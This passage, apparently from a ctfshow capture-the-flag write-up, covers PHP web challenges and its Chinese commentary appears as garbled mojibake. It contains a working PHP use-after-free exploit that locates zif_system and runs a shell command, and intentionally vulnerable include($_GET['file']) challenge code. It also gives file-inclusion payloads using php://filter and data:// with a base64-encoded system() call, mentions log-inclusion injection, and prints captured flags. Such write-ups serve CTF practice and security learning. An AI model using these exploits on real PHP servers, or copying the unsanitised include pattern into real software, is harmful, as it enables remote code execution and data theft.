data-num="149"></td><td><pre>    <span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="150"></td><td><pre>    <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="151"></td><td><pre></pre></td></tr><tr><td data-num="152"></td><td><pre>    <span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="153"></td><td><pre>    <span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="154"></td><td><pre></pre></td></tr><tr><td data-num="155"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="156"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="157"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="158"></td><td><pre></pre></td></tr><tr><td data-num="159"></td><td><pre>    <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="160"></td><td><pre>    <span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="161"></td><td><pre>    <span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="162"></td><td><pre></pre></td></tr><tr><td data-num="163"></td><td><pre>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="164"></td><td><pre>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="165"></td><td><pre></pre></td></tr><tr><td data-num="166"></td><td><pre>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="167"></td><td><pre>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="168"></td><td><pre></pre></td></tr><tr><td data-num="169"></td><td><pre>    <span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="170"></td><td><pre></pre></td></tr><tr><td data-num="171"></td><td><pre>    <span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="172"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="173"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="174"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="175"></td><td><pre></pre></td></tr><tr><td data-num="176"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="177"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="178"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="179"></td><td><pre></pre></td></tr><tr><td data-num="180"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="181"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="182"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="183"></td><td><pre></pre></td></tr><tr><td data-num="184"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="185"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="186"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="187"></td><td><pre></pre></td></tr><tr><td data-num="188"></td><td><pre></pre></td></tr><tr><td data-num="189"></td><td><pre>    <span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="190"></td><td><pre>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="191"></td><td><pre>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="192"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="193"></td><td><pre></pre></td></tr><tr><td data-num="194"></td><td><pre>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="195"></td><td><pre>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="196"></td><td><pre>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="197"></td><td><pre></pre></td></tr><tr><td data-num="198"></td><td><pre>    <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="199"></td><td><pre>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="200"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="201"></td><td><pre></pre></td></tr><tr><td data-num="202"></td><td><pre><span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag0.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="203"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><pre><code>ctfshow&#123;434f032d-5f1b-451a-9c5c-b090d734d653&#125;
</code></pre><h2 id="web73"><a class="anchor" href="#web73">#</a> web73</h2><pre><code>æ–°çŸ¥è¯†var_export()

payload:
c=var_export(scandir('/'));exit();
c=include('/flagc.txt');
</code></pre><pre><code>ctfshow&#123;48365bc1-67eb-479a-9f3e-55675d4d9b89&#125; 
</code></pre><h2 id="web74"><a class="anchor" href="#web74">#</a> web74</h2><p>æ­¢æ­¥äºæ­¤</p><h1 id="æ–‡ä»¶åŒ…å«"><a class="anchor" href="#æ–‡ä»¶åŒ…å«">#</a> æ–‡ä»¶åŒ…å«</h1><h2 id="web78"><a class="anchor" href="#web78">#</a> web78</h2><p>æ–‡ä»¶åŒ…å«ç³»åˆ—å¼€å§‹</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 10:52:43</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-16 10:54:20</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>payload:
?file=php://filter/read=convert.base64-encode/resource=flag.php
</code></pre><pre><code>ctfshow&#123;9af9735a-bd46-4605-ac75-b394be6da3cd&#125;
</code></pre><h2 id="web79"><a class="anchor" href="#web79">#</a> web79</h2><p>æ–‡ä»¶åŒ…å«ç³»åˆ—å¼€å§‹</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 11:10:14</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-16 11:12:38</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>å°†phpæ›¿æ¢æˆ???ï¼Œdata://ä¼ªåè®®ç»•è¿‡å³å¯

payloadï¼š
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=	//&lt;?php system('cat flag');
</code></pre><pre><code>ctfshow&#123;5d32ac0e-6caf-4f29-8b9c-1f18d2984b65&#125;
</code></pre><h2 id="web80"><a class="anchor" href="#web80">#</a> web80</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-16 11:26:29</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230215132610547.png" alt="image-20230215132610547"></p><p>æ—¥å¿—åŒ…å«æ³¨å…¥æ¼æ´å³å¯</p><pre><code>ctfshow&#123;4cdc8e27-0c24-4173-840c-223a72d9fd74&#125;
</code></pre><h2 id="web81"><a class="anchor" href="#web81">#</a> web81</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-16 15:51:31</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230215133628740.png" alt="image-20230215133628740"></p><p>åŒæ—¥å¿—åŒ…å«æ³¨å…¥å³å¯</p><pre><code>ctfshow&#123;974ebae8-9353-4c02-b82b-5b3893384219&#125;
</code></pre><h2 id="web82"><a class="anchor" href="#web82">#</a> web82</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-16 19:34:45</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="web87"><a class="anchor" href="#web87">#</a> web87</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-16 21:57:55</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td 